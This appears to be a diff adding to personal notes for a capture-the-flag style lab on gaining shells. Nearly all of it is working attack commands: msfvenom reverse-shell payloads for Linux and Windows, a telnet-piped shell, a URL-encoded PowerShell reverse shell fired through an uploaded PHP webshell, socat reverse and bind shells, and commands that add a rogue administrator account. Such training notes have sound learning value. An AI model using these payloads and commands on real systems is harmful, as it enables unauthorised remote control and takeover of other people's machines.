@@ -435,3 +435,119 @@ stabilize the netcat:
 
 
 4) **Look through [Payloads all the Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) and try some of the other reverse shell techniques.**
+   
+	 ### **Linux Staged reverse TCP**
+	`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf >reverse.elf`
+
+	 **Linux Stageless reverse TCP**
+	`msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf >reverse.elf`
+
+	generating the `linux` reverse shell msfvenom payload
+	![[Pasted image 20240820231832.png]]
+
+	generating multi/handler exploit serving as a listener using msfconsole ->
+	 - set `payload/linux/x86/meterpreter/reverse_tcp` !!!
+	![[Pasted image 20240820232015.png]]
+	
+
+	transfering the payload file to the target machine:
+	![[Pasted image 20240820232346.png]]
+	![[Pasted image 20240820232438.png]]
+
+	searching for the exploit file
+	![[Pasted image 20240820234148.png]]
+
+	changing permission and run the exploit file 
+	`sudo chmod +x /path/to/reverse.elf`  --> `./reverse.elf`
+	
+
+	 **Telnet**
+	In Attacker machine start two listeners: 
+	- nc -nvlp 8080
+	- nc -nvlp 8081 
+  
+	In Victime machine run below command: 
+	- telnet <Your_IP> 8080 | /bin/sh | telnet <Your_IP> 8081
+
+5) **Upload a webshell on the Windows target and try to obtain a reverse shell using Powershell.**
+	![[Pasted image 20240821010756.png]]
+	
+	setting nc listener -> nc -nvlp 1234
+	
+	changing the url to acces php shell :
+	
+	
+	 machineIP/uploads/php-reverse-shell.php?cmd=
+	`powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22`
+
+6) **The webserver is running with SYSTEM privileges. Create a new user and add it to the "administrators" group, then login over RDP or WinRM.**
+
+	To login using RDP:
+	`xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.189.136 /u:Administrator /p:'TryH4ckM3!'`
+	
+	![[Pasted image 20240821011814.png]]
+
+	create new users and add privileges into the windows machine
+	
+	`net user <username> <password> /add`
+	`net localgroup administrators <username> /add`
+
+	![[Pasted image 20240821011938.png]]
+
+	logging again via RPD using the new privileged credentials:
+	`xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.189.136 /u:nbyte /p:'nbyte'`
+
+7)  **Socat and netcat to obtain reverse and bind shells on the Windows Target.**
+
+	- socat:
+		`socat TCP-L:<port> -`
+		
+		reverse shell (windows)
+		`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes`
+		
+		bind shell(windows):
+		`socat TCP-L:<PORT> EXEC:powershell.exe,pipes`
+
+	- netcat
+		`nc -nvlp 1234`
+		
+		powershell (run in cmd directly):
+		`powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("machineIP",PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`
+
+8) **Create a 64bit Windows Meterpreter shell using msfvenom and upload it to the Windows Target. Activate the shell and catch it with multi/handler. Experiment with the features of this shell.**
+
+	generating msfvenom windows payload:
+	`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.222.83 LPORT=1234 -f exe > reverse.exe`
+
+	creating listener using multi/handler with payload: `windows/meterpreter/reverse_tcp`
+	![[Pasted image 20240821025104.png]]
+
+	transfering the payload file to the attacking windows machine:
+	![[Pasted image 20240821025229.png]]
+	![[Pasted image 20240821025239.png]]
+
+	run the file on the machine ... etc
+
+9) Create both staged and stageless meterpreter shells for either target. Upload and manually activate them, catching the shell with _netcat_ -- does this work?
+
+	- setting up the listener using netcat:
+		`nc -nvlp 1234`
+
+	- generating msfvenom payloads:
+		
+		### **Windows Staged reverse TCP**
+		`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > reverse.exe`
+
+		### **Windows Stageless reverse TCP**
+		`msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > reverse.exe`
+
+		### **Linux Staged reverse TCP**
+		`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf >reverse.elf`
+
+		### **Linux Stageless reverse TCP**
+		`msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf >reverse.elf`
+
+	- uploading manually on the website and open/test them
+		![[Pasted image 20240821025811.png]]
+		![[Pasted image 20240821025829.png]]
+		
